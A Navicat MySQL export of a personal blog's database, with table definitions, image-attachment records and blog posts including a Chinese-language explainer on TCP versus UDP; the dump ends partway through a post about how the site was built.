/*
 Navicat MySQL Data Transfer

 Source Server         : 本机mysql
 Source Server Type    : MySQL
 Source Server Version : 50719
 Source Host           : localhost:3306
 Source Schema         : myblog01

 Target Server Type    : MySQL
 Target Server Version : 50719
 File Encoding         : 65001

 Date: 05/07/2022 13:57:00
*/

SET NAMES utf8mb4;
SET FOREIGN_KEY_CHECKS = 0;

-- ----------------------------
-- Table structure for t_attachment
-- ----------------------------
DROP TABLE IF EXISTS `t_attachment`;
CREATE TABLE `t_attachment`  (
  `Id` int(11) NOT NULL AUTO_INCREMENT,
  `attachname` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '附件名称',
  `attachpath` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '附件路径',
  `attachsmallpath` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '附件缩略图路径',
  `attachtype` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '附件种类',
  `attachsuffix` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '附件后缀',
  `attachsize` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '附件大小',
  `attachwh` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '附件长宽',
  `attachorigin` int(11) NULL DEFAULT NULL COMMENT '附件来源0：上传，1：外部链接',
  `createtime` datetime NULL DEFAULT NULL COMMENT '创建时间',
  `rawsize` bigint(20) NULL DEFAULT NULL COMMENT '原始大小',
  PRIMARY KEY (`Id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 117 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of t_attachment
-- ----------------------------
INSERT INTO `t_attachment` VALUES (88, '20220702_150345_494.jpg', 'https://zyk-xxx.oss-cn-hangzhou.aliyuncs.com//images/2022/7/20220702_150345_494.jpg', 'https://zyk-xxx.oss-cn-hangzhou.aliyuncs.com//images/2022/7/20220702_150345_494_small.jpg', 'image/jpeg', 'jpg', '1.0MB', '4096x2730', 3, '2022-07-02 15:03:48', 1133747);
INSERT INTO `t_attachment` VALUES (89, '20220702_152616_888.jpg', 'https://zyk-xxx.oss-cn-hangzhou.aliyuncs.com//images/2022/7/20220702_152616_888.jpg', 'https://zyk-xxx.oss-cn-hangzhou.aliyuncs.com//images/2022/7/20220702_152616_888_small.jpg', 'image/jpeg', 'jpg', '229KB', '1403x842', 3, '2022-07-02 15:26:18', 234925);
INSERT INTO `t_attachment` VALUES (90, '20220702_152616_477.jpg', 'https://zyk-xxx.oss-cn-hangzhou.aliyuncs.com//images/2022/7/20220702_152616_477.jpg', 'https://zyk-xxx.oss-cn-hangzhou.aliyuncs.com//images/2022/7/20220702_152616_477_small.jpg', 'image/jpeg', 'jpg', '476KB', '2048x1536', 3, '2022-07-02 15:26:19', 488372);
INSERT INTO `t_attachment` VALUES (93, '20220702_153804_995.jpg', 'https://zyk-xxx.oss-cn-hangzhou.aliyuncs.com//images/2022/7/20220702_153804_995.jpg', 'https://zyk-xxx.oss-cn-hangzhou.aliyuncs.com//images/2022/7/20220702_153804_995_small.jpg', 'image/jpeg', 'jpg', '284KB', '2048x1365', 3, '2022-07-02 15:38:06', 291264);
INSERT INTO `t_attachment` VALUES (94, '20220702_153812_785.jpg', 'https://zyk-xxx.oss-cn-hangzhou.aliyuncs.com//images/2022/7/20220702_153812_785.jpg', 'https://zyk-xxx.oss-cn-hangzhou.aliyuncs.com//images/2022/7/20220702_153812_785_small.jpg', 'image/jpeg', 'jpg', '802KB', '4096x2730', 3, '2022-07-02 15:38:13', 821593);
INSERT INTO `t_attachment` VALUES (95, '20220702_153906_812.jpg', 'https://zyk-xxx.oss-cn-hangzhou.aliyuncs.com//images/2022/7/20220702_153906_812.jpg', 'https://zyk-xxx.oss-cn-hangzhou.aliyuncs.com//images/2022/7/20220702_153906_812_small.jpg', 'image/jpeg', 'jpg', '307KB', '1836x1080', 3, '2022-07-02 15:39:08', 315255);
INSERT INTO `t_attachment` VALUES (96, '20220702_153929_373.jpg', 'https://zyk-xxx.oss-cn-hangzhou.aliyuncs.com//images/2022/7/20220702_153929_373.jpg', 'https://zyk-xxx.oss-cn-hangzhou.aliyuncs.com//images/2022/7/20220702_153929_373_small.jpg', 'image/jpeg', 'jpg', '307KB', '1836x1080', 3, '2022-07-02 15:39:30', 315255);
INSERT INTO `t_attachment` VALUES (97, '20220702_153929_682.jpg', 'https://zyk-xxx.oss-cn-hangzhou.aliyuncs.com//images/2022/7/20220702_153929_682.jpg', 'https://zyk-xxx.oss-cn-hangzhou.aliyuncs.com//images/2022/7/20220702_153929_682_small.jpg', 'image/jpeg', 'jpg', '309KB', '1832x1080', 3, '2022-07-02 15:39:30', 316952);
INSERT INTO `t_attachment` VALUES (100, '20220702_153929_567.jpg', 'https://zyk-xxx.oss-cn-hangzhou.aliyuncs.com//images/2022/7/20220702_153929_567.jpg', 'https://zyk-xxx.oss-cn-hangzhou.aliyuncs.com//images/2022/7/20220702_153929_567_small.jpg', 'image/jpeg', 'jpg', '295KB', '1837x1080', 3, '2022-07-02 15:39:30', 302664);
INSERT INTO `t_attachment` VALUES (102, '20220702_153929_189.jpg', 'https://zyk-xxx.oss-cn-hangzhou.aliyuncs.com//images/2022/7/20220702_153929_189.jpg', 'https://zyk-xxx.oss-cn-hangzhou.aliyuncs.com//images/2022/7/20220702_153929_189_small.jpg', 'image/jpeg', 'jpg', '316KB', '1833x1080', 3, '2022-07-02 15:39:31', 324467);
INSERT INTO `t_attachment` VALUES (103, '20220702_153929_419.jpg', 'https://zyk-xxx.oss-cn-hangzhou.aliyuncs.com//images/2022/7/20220702_153929_419.jpg', 'https://zyk-xxx.oss-cn-hangzhou.aliyuncs.com//images/2022/7/20220702_153929_419_small.jpg', 'image/jpeg', 'jpg', '328KB', '1833x1080', 3, '2022-07-02 15:39:31', 336774);
INSERT INTO `t_attachment` VALUES (104, '20220702_153929_685.jpg', 'https://zyk-xxx.oss-cn-hangzhou.aliyuncs.com//images/2022/7/20220702_153929_685.jpg', 'https://zyk-xxx.oss-cn-hangzhou.aliyuncs.com//images/2022/7/20220702_153929_685_small.jpg', 'image/jpeg', 'jpg', '306KB', '1831x1080', 3, '2022-07-02 15:39:31', 313994);
INSERT INTO `t_attachment` VALUES (105, '20220704_075834_341.jpg', 'https://zyk-xxx.oss-cn-hangzhou.aliyuncs.com//images/2022/7/20220704_075834_341.jpg', 'https://zyk-xxx.oss-cn-hangzhou.aliyuncs.com//images/2022/7/20220704_075834_341_small.jpg', 'image/jpeg', 'jpg', '967KB', '2560x1600', 3, '2022-07-04 07:58:36', 990958);
INSERT INTO `t_attachment` VALUES (106, '20220704_075849_293.jpg', 'https://zyk-xxx.oss-cn-hangzhou.aliyuncs.com//images/2022/7/20220704_075849_293.jpg', 'https://zyk-xxx.oss-cn-hangzhou.aliyuncs.com//images/2022/7/20220704_075849_293_small.jpg', 'image/jpeg', 'jpg', '1.0MB', '1920x1080', 3, '2022-07-04 07:58:50', 1938912);
INSERT INTO `t_attachment` VALUES (107, '20220704_083452_878.jpg', 'https://zyk-xxx.oss-cn-hangzhou.aliyuncs.com//images/2022/7/20220704_083452_878.jpg', 'https://zyk-xxx.oss-cn-hangzhou.aliyuncs.com//images/2022/7/20220704_083452_878_small.jpg', 'image/jpeg', 'jpg', '437KB', '1920x1080', 3, '2022-07-04 08:34:54', 447707);
INSERT INTO `t_attachment` VALUES (108, '20220704_135058_782.jpg', 'https://zyk-xxx.oss-cn-hangzhou.aliyuncs.com//images/2022/7/20220704_135058_782.jpg', 'https://zyk-xxx.oss-cn-hangzhou.aliyuncs.com//images/2022/7/20220704_135058_782_small.jpg', 'image/jpeg', 'jpg', '3.0MB', '3840x2160', 3, '2022-07-04 13:51:00', 3632998);
INSERT INTO `t_attachment` VALUES (109, '20220704_143526_710.png', 'https://zyk-xxx.oss-cn-hangzhou.aliyuncs.com//images/2022/7/20220704_143526_710.png', 'https://zyk-xxx.oss-cn-hangzhou.aliyuncs.com//images/2022/7/20220704_143526_710_small.png', 'image/png', 'png', '127KB', '307x308', 2, '2022-07-04 14:35:28', 130606);
INSERT INTO `t_attachment` VALUES (110, '20220704_222244_274.png', 'https://zyk-xxx.oss-cn-hangzhou.aliyuncs.com//images/2022/7/20220704_222244_274.png', 'https://zyk-xxx.oss-cn-hangzhou.aliyuncs.com//images/2022/7/20220704_222244_274_small.png', 'image/png', 'png', '127KB', '307x308', 3, '2022-07-04 22:22:48', 130606);
INSERT INTO `t_attachment` VALUES (111, '20220704_222455_211.png', 'https://zyk-xxx.oss-cn-hangzhou.aliyuncs.com//images/2022/7/20220704_222455_211.png', 'https://zyk-xxx.oss-cn-hangzhou.aliyuncs.com//images/2022/7/20220704_222455_211_small.png', 'image/png', 'png', '2.0MB', '1920x1080', 3, '2022-07-04 22:24:59', 2314328);
INSERT INTO `t_attachment` VALUES (112, '20220704_223241_437.png', 'https://zyk-xxx.oss-cn-hangzhou.aliyuncs.com//images/2022/7/20220704_223241_437.png', 'https://zyk-xxx.oss-cn-hangzhou.aliyuncs.com//images/2022/7/20220704_223241_437_small.png', 'image/png', 'png', '210KB', '308x307', 3, '2022-07-04 22:32:45', 216039);
INSERT INTO `t_attachment` VALUES (113, '20220705_004017_684.png', 'https://zyk-xxx.oss-cn-hangzhou.aliyuncs.com//images/2022/7/20220705_004017_684.png', 'https://zyk-xxx.oss-cn-hangzhou.aliyuncs.com//images/2022/7/20220705_004017_684_small.png', 'image/png', 'png', '210KB', '308x307', 0, '2022-07-05 00:40:51', 216039);
INSERT INTO `t_attachment` VALUES (114, '20220705_004423_213.png', 'https://zyk-xxx.oss-cn-hangzhou.aliyuncs.com//images/2022/7/20220705_004423_213.png', 'https://zyk-xxx.oss-cn-hangzhou.aliyuncs.com//images/2022/7/20220705_004423_213_small.png', 'image/png', 'png', '44KB', '308x307', 0, '2022-07-05 00:44:24', 45266);
INSERT INTO `t_attachment` VALUES (115, '20220705_130740_371.png', 'https://zyk-xxx.oss-cn-hangzhou.aliyuncs.com//images/2022/7/20220705_130740_371.png', 'https://zyk-xxx.oss-cn-hangzhou.aliyuncs.com//images/2022/7/20220705_130740_371_small.png', 'image/png', 'png', '210KB', '308x307', 0, '2022-07-05 13:07:41', 216039);
INSERT INTO `t_attachment` VALUES (116, '20220705_131242_581.jpeg', 'https://zyk-xxx.oss-cn-hangzhou.aliyuncs.com//images/2022/7/20220705_131242_581.jpeg', 'https://zyk-xxx.oss-cn-hangzhou.aliyuncs.com//images/2022/7/20220705_131242_581_small.jpeg', 'image/jpeg', 'jpeg', '114KB', '1000x1000', 0, '2022-07-05 13:12:43', 117514);

-- ----------------------------
-- Table structure for t_blog
-- ----------------------------
DROP TABLE IF EXISTS `t_blog`;
CREATE TABLE `t_blog`  (
  `id` bigint(20) UNSIGNED ZEROFILL NOT NULL AUTO_INCREMENT COMMENT '内容',
  `appreciation` bit(1) NULL DEFAULT b'0',
  `commentabled` bit(1) NULL DEFAULT b'0',
  `content` text CHARACTER SET utf8 COLLATE utf8_general_ci NULL,
  `createTime` datetime NULL DEFAULT NULL COMMENT '创建时间',
  `description` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '概要',
  `firstPicture` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '封面图',
  `flag` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,
  `published` int(11) NOT NULL DEFAULT 0,
  `recommend` bit(1) NULL DEFAULT b'0',
  `shareStatement` bit(1) NULL DEFAULT b'0',
  `title` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '标题',
  `updateTime` datetime NULL DEFAULT NULL COMMENT '修改时间',
  `views` int(11) NULL DEFAULT NULL COMMENT '浏览量',
  `type_id` bigint(20) NULL DEFAULT NULL COMMENT '类型',
  `user_id` bigint(20) NULL DEFAULT NULL COMMENT '作者',
  `comment_count` int(11) NULL DEFAULT 0 COMMENT '评论数',
  `like_count` int(11) NULL DEFAULT 0 COMMENT '点赞数',
  `posttype` int(11) NULL DEFAULT 0 COMMENT '是否转载',
  `url` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE,
  INDEX `FK292449gwg5yf7ocdlmswv9w4j`(`type_id`) USING BTREE,
  INDEX `FK8ky5rrsxh01nkhctmo7d48p82`(`user_id`) USING BTREE,
  CONSTRAINT `FK292449gwg5yf7ocdlmswv9w4j` FOREIGN KEY (`type_id`) REFERENCES `t_type` (`id`) ON DELETE RESTRICT ON UPDATE RESTRICT,
  CONSTRAINT `FK8ky5rrsxh01nkhctmo7d48p82` FOREIGN KEY (`user_id`) REFERENCES `t_user` (`id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB AUTO_INCREMENT = 184 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of t_blog
-- ----------------------------
INSERT INTO `t_blog` VALUES (00000000000000000149, b'0', b'1', '# 前言\r\n\r\n​	在面试中经常被问 TCP 和 UDP 的区别，以及 三次握手 和 四次挥手 。回答的时候参考着网上的内容。TCP 和 UDP 的区别：\r\n\r\n- ​	TCP 是面向连接的，UDP 是面向无连接的\r\n- ​	UDP程序结构较简单\r\n- ​	TCP 是面向字节流的，UDP 是基于数据报的\r\n- ​	TCP 保证数据正确性，UDP 可能丢包\r\n- ​	TCP 保证数据顺序，UDP 不保证\r\n\r\n​	作为一名计算机专业的学生想起面试时经常被问到这方面，既是对知识的好奇，又好奇于面试官的心理。换句话说，我们了解 TCP/UDP、TCP三次握手四次挥手 的现实意义是什么。而查阅网上资料，大部分都是在解释 TCP 和 UDP 是什么。因此，本篇文章主要基于网络资料和自己的理解。\r\n​	要想理解 TCP 和 UDP，我们得先了解它们处于哪一层？\r\n\r\n# 一. 计算机网络体系结构\r\n\r\n![](https://islizx.oss-cn-hangzhou.aliyuncs.com/images/2020/2/20200227_203135_282.jpg)\r\n\r\n​	OSI模型(Open System Interconnection Reference Model):即开放式系统互联通信参考模型。由国际标准化组织提出，一个试图使各种计算机在世界范围内互连为网络的标准框架。\r\n\r\n​	五层协议是教科书版的分法，便于学习和研究而分成五层的。\r\n\r\n​	四层协议是现在实际运用的，就是商业应用的。\r\n\r\n## 1.1 不同层对应的协议\r\n\r\n![](https://islizx.oss-cn-hangzhou.aliyuncs.com/images/2020/2/20200227_203110_173.jpg)\r\n\r\n# 二. UDP\r\n![](https://islizx.oss-cn-hangzhou.aliyuncs.com/images/2020/2/20200227_203102_810.jpg)\r\n\r\n\r\n​	上图是 UDP 的包头格式，可以看出 UDP 格式非常简单，只有源端口和目的端口，端口的功能是为了将数据发个某个应用。\r\n\r\n\r\n## 2.1 UDP 的特点\r\n\r\n- ​	不需要大量的数据结构，处理逻辑和包头字段\r\n- ​	不会建立连接，但是会监听这个地方，谁都可以传给它数据，它也可以传给任何人数据，甚至可以同时传给多个人数据。\r\n- ​	不会根据网络的情况进行拥塞控制，无论是否丢包，它该怎么发还是怎么发\r\n\r\n## 2.2 UDP 的主要应用场景\r\n\r\n​	因为 UDP 的这些特点，所以处理的是一些没那么难的功能，并且就算失败的也能接收。基于这些特点的话，UDP 可以使用在如下场景中：\r\n- ​	需要资源少，网络情况稳定的内网，或者对于丢包不敏感的应用，比如 DHCP 就是基于 UDP 协议的。\r\n- ​	不需要一对一沟通，建立连接，而是可以广播的应用。因为它不面向连接，所以可以做到一对多，承担广播或者多播的协议。\r\n- ​	需要处理速度快，可以容忍丢包，但是即使网络拥塞，也毫不退缩，一往无前的时候\r\n## 2.3 UDP 的几个例子\r\n\r\n- ​	直播。直播对实时性的要求比较高，宁可丢包，也不要卡顿的，所以很多直播应用都基于 UDP 实现了自己的视频传输协议\r\n- ​	实时游戏。游戏的特点也是实时性比较高，在这种情况下，采用自定义的可靠的 UDP 协议，自定义重传策略，能够把产生的延迟降到最低，减少网络问题对游戏造成的影响\r\n- ​	物联网。一方面，物联网领域中断资源少，很可能知识个很小的嵌入式系统，而维护 TCP 协议的代价太大了；另一方面，物联网对实时性的要求也特别高。比如 Google 旗下的 Nest 简历 Thread Group，推出了物联网通信协议 Thread，就是基于 UDP 协议的\r\n\r\n# 三. TCP\r\n![](https://islizx.oss-cn-hangzhou.aliyuncs.com/images/2020/2/20200227_203053_480.jpg)\r\n\r\n​	TCP 的包头有哪些内容，分别有什么用：\r\n\r\n- ​	首先，源端口和目标端口是不可少的。\r\n- ​	接下来是包的序号。主要是为了解决乱序问题。不编好号怎么知道哪个先来，哪个后到\r\n- ​	确认序号。发出去的包应该有确认，这样能知道对方是否收到，如果没收到就应该重新发送，这个解决的是不丢包的问题\r\n- ​	状态位。SYN 是发起一个链接，ACK 是回复，RST 是重新连接，FIN 是结束连接。因为 TCP 是面向连接的，因此需要双方维护连接的状态，这些状态位的包会引起双方的状态变更\r\n- ​	窗口大小，TCP 要做流量控制，需要通信双方各声明一个窗口，标识自己当前的处理能力。\r\n\r\n​	通过对 TCP 头的解析，我们知道要掌握 TCP 协议，应该重点关注以下问题：\r\n\r\n- ​	顺序问题\r\n- ​	丢包问题\r\n- ​	连接维护\r\n- ​	流量控制\r\n- ​	拥塞控制\r\n\r\n## 3.1 TCP 的三次握手\r\n\r\n![](https://islizx.oss-cn-hangzhou.aliyuncs.com/images/2020/2/20200227_203141_72.jpg)\r\n\r\n​	这是网上经常见到的一张图，刚开始的时候，客户端和服务器都处于 CLOSED 状态，先是服务端主动监听某个端口，处于 LISTEN 状态。然后客户端主动发起连接 SYN，之后处于 SYN-SENT 状态。服务端接收了发起的连接，返回 SYN，并且 ACK ( 确认 ) 客户端的 SYN，之后处于 SYN-SENT 状态。客户端接收到服务端发送的 SYN 和 ACK 之后，发送 ACK 的 ACK，之后就处于 ESTAVLISHED 状态，因为它一发一收成功了。服务端收到 ACK 的 ACK 之后，也处于 ESTABLISHED 状态，因为它也一发一收了\r\n## 3.2 TCP 的四次挥手\r\n\r\n![](https://islizx.oss-cn-hangzhou.aliyuncs.com/images/2020/2/20200227_203127_534.jpg)\r\n\r\n​	说完建立连接，再说下断开连接，也被称为四次挥手，可以简单理解如下：\r\n- ​	第一次挥手：双方数据传输的差不多，此时客户端也已经结束传输了，接下来要断开通信连接，所以告诉服务端客户端数据传输完毕（FIN），此时客户端进入等待结束连接的状态。\r\n- ​	第二次挥手：，服务端知道客户端数据传输完毕（ACK），但服务端可能还有数据未传输，接着继续传输。\r\n- ​	第三次挥手：此时客户端接收数据继续处于等待结束的状态，然后服务器端也传输完毕，自身此时处于等待关闭连接的状态，并对告诉客户端，自己的数据也传输完毕（FIN）”\r\n- ​	第四次挥手：客户端知道服务端也传输完毕，也要告诉服务端一声（ACK），因为连接和断开要双方都按下关闭操作才能断开，客户端同时又为自己定义一个定时器，因为不知道刚才说的这句话能不能准确到达服务端（网络不稳定或者其他因素引起的网络原因），默认时间定为两个通信的最大时间之和，超出这个时间就默认服务器端已经接收到了自己的确认信息，此时客户端就关闭自身连接，服务器端一旦接收到客户端发来的确定通知就立刻关闭服务器端的连接\r\n\r\n​	到此为止双方整个通信过程就此终结。但断开链接不一定就是客户端，谁都可以先发起断开指令，另外客户端和服务端是没有固定标准的，谁先发起请求谁就是客户端。\r\n## 3.3 TCP 累计确认\r\n\r\n​	首先为了保证顺序性，每个包都有一个 ID。在建立连接的时候会商定起始 ID 是什么，然后按照 ID 一个个发送，为了保证不丢包，需要对发送的包都要进行应答，当然，这个应答不是一个一个来的，而是会应答某个之前的 ID，表示都收到了，这种模式成为累计应答或累计确认。\r\n\r\n​	为了记录所有发送的包和接收的包，TCP 需要发送端和接收端分别来缓存这些记录，发送端的缓存里是按照包的 ID 一个个排列，根据处理的情况分成四个部分\r\n\r\n- ​	发送并且确认的\r\n- ​	发送尚未确认的\r\n- ​	没有发送等待发送的\r\n- ​	没有发送并且暂时不会发送的\r\n\r\n​	这里的第三部分和第四部分就属于流量控制的内容\r\n\r\n​	在 TCP 里，接收端会给发送端报一个窗口大小，叫 Advertised window。这个窗口应该等于上面的第二部分加上第三部分，超过这个窗口，接收端做不过来，就不能发送了，于是，发送端要保持下面的数据结构：\r\n​	对于接收端来讲，它的缓存里面的内容要简单一些\r\n\r\n- ​	接收并且确认过的\r\n- ​	还没接收，但是马上就能接收的\r\n- ​	还没接收，但也无法接收的\r\n\r\n## 3.4 TCP 顺序问题和丢包问题\r\n\r\n​	举个例子：在发送端，1、2、3 已发送并确认；4、5、6、7、8、9 都是发送了还没确认；10、11、12 是还没发出的；13、14、15 是接收方没有空间，不准备发的。\r\n\r\n​	在接收端来看，1、2、3、4、5 是已经完成 ACK 但是还没读取的；6、7 是等待接收的；8、9 是已经接收还没有 ACK 的。\r\n\r\n​	发送端和接收端当前的状态如下：\r\n\r\n- ​	1、2、3 没有问题，双方达成了一致\r\n\r\n- ​	4、5 接收方说 ACK 了，但是发送方还没收到\r\n\r\n- ​	6、7、8、9 肯定都发了，但是 8、9 已经到了，6、7 没到，出现了乱序，缓存着但是没办法 ACK。\r\n\r\n​	根据这个例子可以知道顺序问题和丢包问题都有可能存在，所以我们先来看确认与重传机制。\r\n\r\n​	假设 4 的确认收到了，5 的 ACK 丢了，6、7 的数据包丢了，该怎么办？\r\n\r\n​	一种方法是超时重试，即对每一个发送了但是没有 ACK 的包设定一个定时器，超过了一定的事件就重新尝试。这个时间必须大于往返时间，但也不宜过长，否则超时时间变长，访问就变慢了。\r\n​	如果过一段时间，5、6、7 都超时了就会重新发送。接收方发现 5 原来接收过，于是丢弃 5；6 收到了，发送 ACK，要求下一个是 7，7 不幸又丢了。当 7 再次超时的时候，TCP 的策略是超时间隔加倍。每当遇到一次超时重传的时候，都会讲下一次超时时间间隔设为先前值的两倍。\r\n\r\n​	超时重传的机制是超时周期可能相对较长，是否有更快的方式呢？\r\n\r\n​	有一个快速重传的机制，即当接收方接收到一个序号大于期望的报文段时，就检测到了数据流之间的间隔，于是发送三个冗余的 ACK，客户端接收到之后，知道数据报丢失，于是重传丢失的报文段。\r\n​	例如，接收方发现 6、8、9 都接收了，但是 7 没来，所以肯定丢了，于是发送三个 6 的 ACK，要求下一个是 7。客户端接收到 3 个，就会发现 7 的确又丢了，不等超时，马上重发。\r\n\r\n## 3.4 TCP 流量控制的问题\r\n\r\n​	在流量控制的机制里面，在对于包的确认中，会携带一个窗口的大小\r\n\r\n​	简单的说一下就是接收端在发送 ACK 的时候会带上缓冲区的窗口大小，但是一般在窗口达到一定大小才会更新窗口，因为每次都更新的话，刚空下来就又被填满了\r\n\r\n## 3.5 TCP 拥塞控制的问题\r\n\r\n​	也是通过窗口的大小来控制的，但是检测网络满不满是个挺难的事情，所以 TCP 发送包经常被比喻成往谁管理灌水，所以拥塞控制就是在不堵塞，不丢包的情况下尽可能的发挥带宽。\r\n\r\n​	水管有粗细，网络有带宽，即每秒钟能发送多少数据；水管有长度，端到端有时延。理想状态下，水管里面的水 = 水管粗细 * 水管长度。对于网络上，通道的容量 = 带宽 * 往返时延。\r\n\r\n​	如果我们设置发送窗口，使得发送但未确认的包为通道的容量，就能撑满整个管道。\r\n\r\n\r\n\r\n​	假设往返时间为 8 秒，去 4 秒，回 4 秒，每秒发送一个包，已经过去了 8 秒，则 8 个包都发出去了，其中前四个已经到达接收端，但是 ACK 还没返回，不能算发送成功，5-8 后四个包还在路上，还没被接收，这个时候，管道正好撑满，在发送端，已发送未确认的 8 个包，正好等于带宽，也即每秒发送一个包，也即每秒发送一个包，乘以来回时间 8 秒。\r\n\r\n​	如果在这个基础上调大窗口，使得单位时间可以发送更多的包，那么会出现接收端处理不过来，多出来的包会被丢弃，这个时候，我们可以增加一个缓存，但是缓存里面的包 4 秒内肯定达不到接收端课，它的缺点会增加时延，如果时延达到一定程度就会超时重传\r\n\r\n​	TCP 拥塞控制主要来避免两种现象，包丢失和超时重传，一旦出现了这些现象说明发送的太快了，要慢一点。\r\n\r\n​	具体的方法就是发送端慢启动，比如倒水，刚开始倒的很慢，渐渐变快。然后设置一个阈值，当超过这个值的时候就要慢下来\r\n\r\n​	慢下来还是在增长，这时候就可能水满则溢，出现拥塞，需要降低倒水的速度，等水慢慢渗下去。\r\n\r\n​	拥塞的一种表现是丢包，需要超时重传，这个时候，采用快速重传算法，将当前速度变为一半。所以速度还是在比较高的值，也没有一夜回到解放前。\r\n\r\n# 四. 总结\r\n## 4.1 TCP 和 UDP 的区别\r\n\r\n- ​	TCP 是面向连接的，UDP 是面向无连接的\r\n- ​	UDP程序结构较简单\r\n- ​	- ​	TCP 是面向字节流的，UDP 是基于数据报的\r\n- ​	TCP 保证数据正确性，UDP 可能丢包\r\n- ​	TCP 保证数据顺序，UDP 不保证\r\n\r\n## 4.2 什么是面向连接，什么是面向无连接\r\n\r\n- ​	在互通之前，面向连接的协议会先建立连接，如 TCP 有三次握手，而 UDP 不会\r\n\r\n## 4.3 TCP 为什么是可靠连接\r\n\r\n- ​	通过 TCP 连接传输的数据无差错，不丢失，不重复，且按顺序到达。\r\n- ​	TCP 报文头里面的序号能使 TCP 的数据按序到达\r\n- ​	报文头里面的确认序号能保证不丢包，累计确认及超时重传机制\r\n- ​	TCP 拥有流量控制及拥塞控制的机制\r\n- ​	 的顺序问题，丢包问题，流量控制都是通过滑动窗口来解决的\r\n- ​	拥塞控制时通过拥塞窗口来解决的\r\n\r\n​	 TCP/IP并不是一个完美的协议,但是它却能在那么多的网络协议中脱颖而出,至少表明它是出色的,至少在目前还没有任何协议可以取代它。\r\n\r\n​	 文章主要内容摘自https://www.cnblogs.com/reload-sun/p/12216936.html', '2020-02-24 21:36:13', '在面试中经常被问 TCP 和 UDP 的区别，以及 三次握手 和 四次挥手 。回答的时候参考着网上的内容。作为一名计算机专业的学生想起面试时经常被问到这方面，既是对知识的好奇，又好奇于面试官的心理。换句话说', 'https://islizx.oss-cn-hangzhou.aliyuncs.com/images/2020/2/20200227_203119_83.jpg', '转载', 0, b'1', b'0', 'TCP和UDP总结', '2020-03-12 14:36:18', 24575, 53, 3, 0, 0, 0, NULL);
INSERT INTO `t_blog` VALUES (00000000000000000150, b'0', b'1', '##### 请在申请友链之前请在贵站加好本站的链接\r\n\r\n- ​	名称：islizx -Blog\r\n- ​	网址：https://islizx.cn\r\n- ​	头像：<img src=\"/images/islizx.jpg\" style=\"zoom:25%;\" />\r\n\r\n##### 申请方法\r\n\r\n- ​	在下方留言或者任意其他位置留言\r\n- ​	如需设置友链头像可通过QQ、微信或者Email联系博主\r\n\r\n##### 备注\r\n\r\n- ​	不健康站、未备案站、非常见域名后缀等 **不友链**\r\n- ​	欢迎加好友交流学习', '2020-02-27 21:17:48', NULL, NULL, NULL, 0, b'0', b'0', '友链申请', '2020-02-27 21:53:24', 6015, NULL, 3, 0, 0, 0, 'apply-links');
INSERT INTO `t_blog` VALUES (00000000000000000151, b'0', b'1', '##### 有什么问题欢迎在此处留言\r\n##### 您的支持和鼓励是我最大的动力！', '2020-02-27 22:05:42', NULL, NULL, NULL, 0, b'0', b'0', '留言板', '2020-02-27 22:05:42', 115, NULL, 3, 0, 0, 0, 'message');
INSERT INTO `t_blog` VALUES (00000000000000000153, b'0', b'1', '## 	前言\r\n\r\n​	首先，建立个人网站是大二的时候萌生的一个想法，网站前前后后推翻重构了三次。由原本的struts+jsp+servlet变成ssh，到现在的ssm。其中前台前端框架使用的是semantic ui，后台前端框架使用的是bootstrap，模板引擎使用的是thymeleaf。总的来说，整个网站使用的技术架构比较简单，但是随着新技术的学习，网站将来还是会更新技术架构。预览地址：https://islizx.cn\r\n\r\n​	项目源码已托管至GitHub，GitHub地址：https://github.com/isLizx/islizxBlog。 如果可以，GitHub上麻烦给个star。\r\n\r\n## 一.建站故事与技术架构\r\n\r\n### 	1.1 建站过程\r\n\r\n​	萌生开发个人博客网站的想法是因为学校毕业设计需要交一个自己开发的网站项目。加上平时遇问题到网上找答案，看到博客园、CSDN等技术博客平台的人有自己的网站着实有点羡慕。于是将自己的毕业设计主题选择为个人博客网站。毕竟，哪个男孩不想有一个属于自己的网站呢？期初学的是简单的struts，加上之前学的jsp和servlet简简单单的写了一个博客项目。\r\n\r\n![](https://islizx.oss-cn-hangzhou.aliyuncs.com/images/2020/2/20200229_170112_244.png)\r\n\r\n![](https://islizx.oss-cn-hangzhou.aliyuncs.com/images/2020/2/20200229_170112_152.png)\r\n\r\n​	第一版功能简单，后台还有一些功能没有实现以及存在许多bug，但至少能够发博客了。\r\n\r\n​	第二版参考李仁密的开发小而美博客的视频，只不过他使用的是springboot，而我改成了Struts+Spring+Hiernate。功能上和他一样，只是技术架构不同。\r\n\r\n![](https://islizx.oss-cn-hangzhou.aliyuncs.com/images/2020/2/20200229_170112_996.png)\r\n\r\n![](https://islizx.oss-cn-hangzhou.aliyuncs.com/images/2020/2/20200229_170112_32.png)\r\n\r\n​	该项目源码目前托管在GitHub上，地址 https://github.com/isLizx/blog 感兴趣的同学可以看一看。\r\n\r\n​	现在的版本前台页面还是采用李仁密博客的模板。后台自己在网上找了一个后台管理的bootstrap模板，前端自己改，后端自己全部重写，最终变成了现在这个版本。总之，页面现在看着还算凑合，但是仔细看看还是有一些问题。比如首页的轮播组件存在动画累积的问题，部分页面存在移动端不适应，有些地方还存在一些bug。只能等之后自己仔细琢磨一下前端了。\r\n\r\n### 1.2 